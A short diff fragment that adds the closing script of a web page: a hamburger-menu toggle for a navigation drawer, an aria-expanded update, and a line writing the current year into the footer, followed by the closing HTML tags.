+  ham.textContent=o?'✕':'☰';
+});
+dr.addEventListener('click',function(e){if(e.target.tagName==='A'){dr.classList.remove('open');ham.setAttribute('aria-expanded','false');ham.textContent='☰';}});
+document.getElementById('yr').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
